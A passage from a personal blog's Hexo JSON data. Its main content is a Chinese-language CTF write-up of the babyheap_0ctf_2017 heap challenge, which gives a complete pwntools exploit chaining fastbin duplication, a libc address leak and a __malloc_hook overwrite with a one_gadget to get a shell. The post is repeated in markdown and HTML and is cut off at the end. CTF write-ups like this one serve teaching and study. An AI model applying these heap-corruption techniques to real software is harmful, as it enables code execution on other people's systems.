id=\"Books\">Books:</h2>\n<ul>\n<li>Literature</li>\n<li>History</li>\n<li>Monograph</li>\n<li>Fiction</li>\n<li>…</li>\n</ul>\n<h1 id=\"Contact-me\">Contact me</h1>\n<p>e-mail:</p>\n<ul>\n<li>\n<p>Personal e-mail: <a href=\"mailto:wzhdxtx123@outlook.com\">wzhdxtx123@outlook.com</a></p>\n</li>\n<li>\n<p>work e-mail: <a href=\"mailto:nemoxxw@whu.edu.cn\">nemoxxw@whu.edu.cn</a></p>\n</li>\n</ul>\n<p>QQ: 2499291623</p>\n<p>Github: <a href=\"https://github.com/Du-Mu\">github.com/Du-Mu</a></p>\n"},{"title":"Categories","layout":"categories","comments":0,"_content":"\n\n","source":"categories/index.md","raw":"---\ntitle: Categories\nlayout: categories \ncomments: false\n---\n\n\n","date":"2022-06-29T15:40:14.538Z","updated":"2022-06-29T15:40:14.538Z","path":"categories/index.html","_id":"cl6g6maj60002j8v0a75ddf8a","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Links","layout":"link","comments":0,"sidebar":"none","_content":"\n\n\n***NULL***\n\n快来个人和我互关#_#","source":"links/index.md","raw":"---\ntitle: Links\nlayout: link\ncomments: false\nsidebar: none\n---\n\n\n\n***NULL***\n\n快来个人和我互关#_#","date":"2022-06-29T14:01:36.126Z","updated":"2022-06-29T14:01:36.126Z","path":"links/index.html","_id":"cl6g6maj90006j8v00x8bdpfi","content":"<p><em><strong>NULL</strong></em></p>\n<p>快来个人和我互关#_#</p>\n","site":{"data":{}},"excerpt":"","more":"<p><em><strong>NULL</strong></em></p>\n<p>快来个人和我互关#_#</p>\n"},{"title":"Repositories","layout":"repository","comments":0,"sidebar":"none","_content":"\n","source":"repository/index.md","raw":"---\ntitle: Repositories\nlayout: repository\ncomments: false\nsidebar: none\n---\n\n","date":"2022-06-29T07:14:46.657Z","updated":"2022-06-29T07:14:46.651Z","path":"repository/index.html","_id":"cl6g6maja0008j8v0efy8axfr","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Tags","layout":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: Tags\nlayout: tags\ncomments: false\n---","date":"2022-06-29T15:39:20.303Z","updated":"2022-06-29T15:39:20.303Z","path":"tags/index.html","_id":"cl6g6majb000aj8v02tacamy8","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Basic-Heap-Exploitation","date":"2022-05-23T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n# The Basic of Heap Exploitation\n\n基础堆漏洞利用:\n主要知识点：\n\n- fastbin_dup\n- fake_chunk\n- 劫持__malloc_hook\n\n\n\n## babyheap_0ctf_2017\n\n### 0x1 checksec\n\n```bash\n[*]\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n保护全开，堆题日常操作\n\n### 0x2 Analysis\n\n漏洞点：\n\n```c\n__int64 __fastcall sub_E7F(__int64 a1)\n{\n  __int64 result; // rax\n  int v2; // [rsp+18h] [rbp-8h]\n  int v3; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"Index: \");\n  result = sub_138C();\n  v2 = result;\n  if ( (int)result >= 0 && (int)result <= 15 )\n  {\n    result = *(unsigned int *)(24LL * (int)result + a1);\n    if ( (_DWORD)result == 1 )\n    {\n      printf(\"Size: \");\n        //重新读取了一个size\n      result = sub_138C();\n      v3 = result;\n      if ( (int)result > 0 )\n      {\n        printf(\"Content: \");\n        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);\n      }\n    }\n  }\n  return result;\n}\n```\n\n在fill的实现函数中，填充的字符size是重新输入的，所以这个地方可以进行溢出\n\n\n\n### 0x3 Process\n\n1. 泄漏libc_base\n2. 劫持__malloc_hooc(利用偏移)\n3. getshell\n\n\n\n### 0x4 Some Questions\n- 利用偏移制造fake_chunk时,算错\n- 泄漏的地址和__malloc_hook相对于libc_base的偏移都可以通过本地调试获取\n\n### 0x4 exp\n\n这个题是参考《CTF竞赛权威指南》进行的一个复现:\n\n```python\nfrom pwn import*\n\n\np = process('./babyheap')\n\ncontext.log_level = 'debug'\n\ndef alloc(size):\n    p.sendlineafter('Command: ','1')\n    p.sendlineafter('Size: ',str(size))\n\ndef fill(idx,payload):\n    p.sendlineafter('Command: ','2')\n    p.sendlineafter('Index: ',str(idx))\n    p.sendlineafter('Size: ',str(len(payload)))\n    p.sendafter('Content: ',payload)\n\ndef free(idx):\n    p.sendlineafter('Command: ','3')\n    p.sendlineafter('Index: ',str(idx))\n\ndef dump(idx):\n    p.sendlineafter('Command: ','4')\n    p.sendlineafter('Index: ',str(idx))\n    p.recvuntil('Content: \\n')\n    return p.recvline()\n\ndef fastbin_dup():\n    alloc(0x10)\n    alloc(0x10)\n    alloc(0x10)\n    alloc(0x10)\n    alloc(0x80)\n    free(1)\n    free(2)\n\t\n    payload = cyclic(0x10)\n    payload+= p64(0) + p64(0x21)\n    payload+= p64(0) + cyclic(0x8)\n    payload+= p64(0) + p64(0x21)\n    payload+= p8(0x80)\n    fill(0,payload)\n    //将2号chunk的fd指针改成最后一个大小0x80的4号chunk\n    //利用第一个chunk偏移为0的特点在没有泄漏时实现(在实现了tcache机制的libc版本有所不同，系统会先分配一段空间给tcache使用)\n    payload = cyclic(0x10)\n    payload+= p64(0) + p64(0x21)\n    fill(3,payload)\n    //更改4号chunk的size区，使得其能绕过检查\n    alloc(0x10)\n    alloc(0x10)\n    //在原4号chunk位置再分配\n\ndef leak_libc():\n    global libc_base,malloc_hook\n\n    payload = cyclic(0x10)\n    payload+= p64(0) + p64(0x91)\n    fill(3,payload)\n    //4号chunksize改回来\n    alloc(0x80)\n    free(4)\n    leak_addr = u64(dump(2)[:8])\n    //释放后来到unsort_bin,fd和bk指向libc地址\n    libc_base = leak_addr - 0x3c3b78\n\t\n    malloc_hook = libc_base + 0x3c3b10\n\n    log.info('leak add: 0x%x' % leak_addr)\n    log.info('libc base: 0x%x' % libc_base)\n    log.info('__malloc_hook add: 0x%x' % malloc_hook)\n\ndef pwn():\n    alloc(0x60)\n    free(4)\n    fill(2,p64(malloc_hook - 0x28 + 0x5))\n    //利用偏移伪造fake_chunk\n    alloc(0x60)\n    alloc(0x60)\n    //分配到fake_chunk(malloc_hook 附近)\n    one_gadget = libc_base + 0x4525a\n    fill(6,p8(0)*0x13 + p64(one_gadget))\n    //将one_gadget写入hook\n    alloc(1)\n    p.interactive()\n\nif __name__=='__main__':\n    fastbin_dup()\n    leak_libc()\n    pwn()\n\n```\n\n\n### 0x6 New Skills\n- 利用偏移制造fake_chunk:\n一般libc地址最高位为7f，符合fast_bin对size的检查\n所以可以通过偏移，将此字节移动到size位实现\n\n- 利用unsort_bin泄漏libc地址\n当unsort_bin只有一个chunk时，其fd和bk都指向libc的地址，所以可以通过此，泄漏libc地址\n一般需要能够在释放后仍然能够控制或读取此chunk\n- 直接通过堆溢出制造实现UAF\n核心：在没有tcache机制的的libc下，chunk固定从一个内存页面的开始部分进行分配，所以，对于分配的chunk的地址最后一个字节，是可以推算出来的","source":"_posts/Basic-Heap-Exploitation.md","raw":"---\ntitle: Basic-Heap-Exploitation\ndate: 2022-5-24\ntags: \n- Pwn\n- CTF\n\ncategories:\n- CTF\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n# The Basic of Heap Exploitation\n\n基础堆漏洞利用:\n主要知识点：\n\n- fastbin_dup\n- fake_chunk\n- 劫持__malloc_hook\n\n\n\n## babyheap_0ctf_2017\n\n### 0x1 checksec\n\n```bash\n[*]\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n保护全开，堆题日常操作\n\n### 0x2 Analysis\n\n漏洞点：\n\n```c\n__int64 __fastcall sub_E7F(__int64 a1)\n{\n  __int64 result; // rax\n  int v2; // [rsp+18h] [rbp-8h]\n  int v3; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"Index: \");\n  result = sub_138C();\n  v2 = result;\n  if ( (int)result >= 0 && (int)result <= 15 )\n  {\n    result = *(unsigned int *)(24LL * (int)result + a1);\n    if ( (_DWORD)result == 1 )\n    {\n      printf(\"Size: \");\n        //重新读取了一个size\n      result = sub_138C();\n      v3 = result;\n      if ( (int)result > 0 )\n      {\n        printf(\"Content: \");\n        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);\n      }\n    }\n  }\n  return result;\n}\n```\n\n在fill的实现函数中，填充的字符size是重新输入的，所以这个地方可以进行溢出\n\n\n\n### 0x3 Process\n\n1. 泄漏libc_base\n2. 劫持__malloc_hooc(利用偏移)\n3. getshell\n\n\n\n### 0x4 Some Questions\n- 利用偏移制造fake_chunk时,算错\n- 泄漏的地址和__malloc_hook相对于libc_base的偏移都可以通过本地调试获取\n\n### 0x4 exp\n\n这个题是参考《CTF竞赛权威指南》进行的一个复现:\n\n```python\nfrom pwn import*\n\n\np = process('./babyheap')\n\ncontext.log_level = 'debug'\n\ndef alloc(size):\n    p.sendlineafter('Command: ','1')\n    p.sendlineafter('Size: ',str(size))\n\ndef fill(idx,payload):\n    p.sendlineafter('Command: ','2')\n    p.sendlineafter('Index: ',str(idx))\n    p.sendlineafter('Size: ',str(len(payload)))\n    p.sendafter('Content: ',payload)\n\ndef free(idx):\n    p.sendlineafter('Command: ','3')\n    p.sendlineafter('Index: ',str(idx))\n\ndef dump(idx):\n    p.sendlineafter('Command: ','4')\n    p.sendlineafter('Index: ',str(idx))\n    p.recvuntil('Content: \\n')\n    return p.recvline()\n\ndef fastbin_dup():\n    alloc(0x10)\n    alloc(0x10)\n    alloc(0x10)\n    alloc(0x10)\n    alloc(0x80)\n    free(1)\n    free(2)\n\t\n    payload = cyclic(0x10)\n    payload+= p64(0) + p64(0x21)\n    payload+= p64(0) + cyclic(0x8)\n    payload+= p64(0) + p64(0x21)\n    payload+= p8(0x80)\n    fill(0,payload)\n    //将2号chunk的fd指针改成最后一个大小0x80的4号chunk\n    //利用第一个chunk偏移为0的特点在没有泄漏时实现(在实现了tcache机制的libc版本有所不同，系统会先分配一段空间给tcache使用)\n    payload = cyclic(0x10)\n    payload+= p64(0) + p64(0x21)\n    fill(3,payload)\n    //更改4号chunk的size区，使得其能绕过检查\n    alloc(0x10)\n    alloc(0x10)\n    //在原4号chunk位置再分配\n\ndef leak_libc():\n    global libc_base,malloc_hook\n\n    payload = cyclic(0x10)\n    payload+= p64(0) + p64(0x91)\n    fill(3,payload)\n    //4号chunksize改回来\n    alloc(0x80)\n    free(4)\n    leak_addr = u64(dump(2)[:8])\n    //释放后来到unsort_bin,fd和bk指向libc地址\n    libc_base = leak_addr - 0x3c3b78\n\t\n    malloc_hook = libc_base + 0x3c3b10\n\n    log.info('leak add: 0x%x' % leak_addr)\n    log.info('libc base: 0x%x' % libc_base)\n    log.info('__malloc_hook add: 0x%x' % malloc_hook)\n\ndef pwn():\n    alloc(0x60)\n    free(4)\n    fill(2,p64(malloc_hook - 0x28 + 0x5))\n    //利用偏移伪造fake_chunk\n    alloc(0x60)\n    alloc(0x60)\n    //分配到fake_chunk(malloc_hook 附近)\n    one_gadget = libc_base + 0x4525a\n    fill(6,p8(0)*0x13 + p64(one_gadget))\n    //将one_gadget写入hook\n    alloc(1)\n    p.interactive()\n\nif __name__=='__main__':\n    fastbin_dup()\n    leak_libc()\n    pwn()\n\n```\n\n\n### 0x6 New Skills\n- 利用偏移制造fake_chunk:\n一般libc地址最高位为7f，符合fast_bin对size的检查\n所以可以通过偏移，将此字节移动到size位实现\n\n- 利用unsort_bin泄漏libc地址\n当unsort_bin只有一个chunk时，其fd和bk都指向libc的地址，所以可以通过此，泄漏libc地址\n一般需要能够在释放后仍然能够控制或读取此chunk\n- 直接通过堆溢出制造实现UAF\n核心：在没有tcache机制的的libc下，chunk固定从一个内存页面的开始部分进行分配，所以，对于分配的chunk的地址最后一个字节，是可以推算出来的","slug":"Basic-Heap-Exploitation","published":1,"updated":"2022-07-12T12:02:34.546Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6maj40001j8v09xio976v","content":"<h1 id=\"The-Basic-of-Heap-Exploitation\">The Basic of Heap Exploitation</h1>\n<p>基础堆漏洞利用:<br>\n主要知识点：</p>\n<ul>\n<li>fastbin_dup</li>\n<li>fake_chunk</li>\n<li>劫持__malloc_hook</li>\n</ul>\n<h2 id=\"babyheap-0ctf-2017\">babyheap_0ctf_2017</h2>\n<h3 id=\"0x1-checksec\">0x1 checksec</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*]</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>保护全开，堆题日常操作</p>\n<h3 id=\"0x2-Analysis\">0x2 Analysis</h3>\n<p>漏洞点：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_E7F</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  result = sub_138C();</span><br><span class=\"line\">  v2 = result;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)result &gt;= <span class=\"number\">0</span> &amp;&amp; (<span class=\"type\">int</span>)result &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">24LL</span> * (<span class=\"type\">int</span>)result + a1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (_DWORD)result == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//重新读取了一个size</span></span><br><span class=\"line\">      result = sub_138C();</span><br><span class=\"line\">      v3 = result;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)result &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sub_11B2(*(_QWORD *)(<span class=\"number\">24LL</span> * v2 + a1 + <span class=\"number\">16</span>), v3);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在fill的实现函数中，填充的字符size是重新输入的，所以这个地方可以进行溢出</p>\n<h3 id=\"0x3-Process\">0x3 Process</h3>\n<ol>\n<li>泄漏libc_base</li>\n<li>劫持__malloc_hooc(利用偏移)</li>\n<li>getshell</li>\n</ol>\n<h3 id=\"0x4-Some-Questions\">0x4 Some Questions</h3>\n<ul>\n<li>利用偏移制造fake_chunk时,算错</li>\n<li>泄漏的地址和__malloc_hook相对于libc_base的偏移都可以通过本地调试获取</li>\n</ul>\n<h3 id=\"0x4-exp\">0x4 exp</h3>\n<p>这个题是参考《CTF竞赛权威指南》进行的一个复现:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./babyheap&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fill</span>(<span class=\"params\">idx,payload</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;Content: &#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dump</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Command: &#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fastbin_dup</span>():</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    free(<span class=\"number\">2</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">    payload = cyclic(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">    payload+= p8(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">    //将<span class=\"number\">2</span>号chunk的fd指针改成最后一个大小<span class=\"number\">0x80</span>的<span class=\"number\">4</span>号chunk</span><br><span class=\"line\">    //利用第一个chunk偏移为<span class=\"number\">0</span>的特点在没有泄漏时实现(在实现了tcache机制的libc版本有所不同，系统会先分配一段空间给tcache使用)</span><br><span class=\"line\">    payload = cyclic(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">    //更改<span class=\"number\">4</span>号chunk的size区，使得其能绕过检查</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    //在原<span class=\"number\">4</span>号chunk位置再分配</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_libc</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> libc_base,malloc_hook</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = cyclic(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload+= p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">    //<span class=\"number\">4</span>号chunksize改回来</span><br><span class=\"line\">    alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">    free(<span class=\"number\">4</span>)</span><br><span class=\"line\">    leak_addr = u64(dump(<span class=\"number\">2</span>)[:<span class=\"number\">8</span>])</span><br><span class=\"line\">    //释放后来到unsort_bin,fd和bk指向libc地址</span><br><span class=\"line\">    libc_base = leak_addr - <span class=\"number\">0x3c3b78</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    malloc_hook = libc_base + <span class=\"number\">0x3c3b10</span></span><br><span class=\"line\"></span><br><span class=\"line\">    log.info(<span class=\"string\">&#x27;leak add: 0x%x&#x27;</span> % leak_addr)</span><br><span class=\"line\">    log.info(<span class=\"string\">&#x27;libc base: 0x%x&#x27;</span> % libc_base)</span><br><span class=\"line\">    log.info(<span class=\"string\">&#x27;__malloc_hook add: 0x%x&#x27;</span> % malloc_hook)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    free(<span class=\"number\">4</span>)</span><br><span class=\"line\">    fill(<span class=\"number\">2</span>,p64(malloc_hook - <span class=\"number\">0x28</span> + <span class=\"number\">0x5</span>))</span><br><span class=\"line\">    //利用偏移伪造fake_chunk</span><br><span class=\"line\">    alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    //分配到fake_chunk(malloc_hook 附近)</span><br><span class=\"line\">    one_gadget = libc_base + <span class=\"number\">0x4525a</span></span><br><span class=\"line\">    fill(<span class=\"number\">6</span>,p8(<span class=\"number\">0</span>)*<span class=\"number\">0x13</span> + p64(one_gadget))</span><br><span class=\"line\">    //将one_gadget写入hook</span><br><span class=\"line\">    alloc(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    fastbin_dup()</span><br><span class=\"line\">    leak_libc()</span><br><span class=\"line\">    pwn()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"0x6-New-Skills\">0x6 New Skills</h3>\n<ul>\n<li>\n<p>利用偏移制造fake_chunk:<br>\n一般libc地址最高位为7f，符合fast_bin对size的检查<br>\n所以可以通过偏移，将此字节移动到size位实现</p>\n</li>\n<li>\n<p>利用unsort_bin泄漏libc地址<br>\n当unsort_bin只有一个chunk时，其fd和bk都指向libc的地址，所以可以通过此，泄漏libc地址<br>\n一般需要能够在释放后仍然能够控制或读取此chunk</p>\n</li>\n<li>\n<p>直接通过堆溢出制造实现UAF<br>\n核心：在没有tcache机制的的libc下，chunk固定从一个内存页面的开始部分进行分配，所以，对于分配的chunk的地址最后一个字节，是可以推算出来的</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"The-Basic-of-Heap-Exploitation\">The Basic of Heap Exploitation</h1>\n<p>基础堆漏洞利用:<br>\n主要知识点：</p>\n<ul>\n<li>fastbin_dup</li>\n<li>fake_chunk</li>\n<li>劫持__malloc_hook</li>\n</ul>\n<h2 id=\"babyheap-0ctf-2017\">babyheap_0ctf_2017</h2>\n<h3 id=\"0x1-checksec\">0x1 checksec</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*]</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>保护全开，堆题日常操作</p>\n<h3 id=\"0x2-Analysis\">0x2 Analysis</h3>\n<p>漏洞点：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_E7F</span><span class=\"params\">(__int64 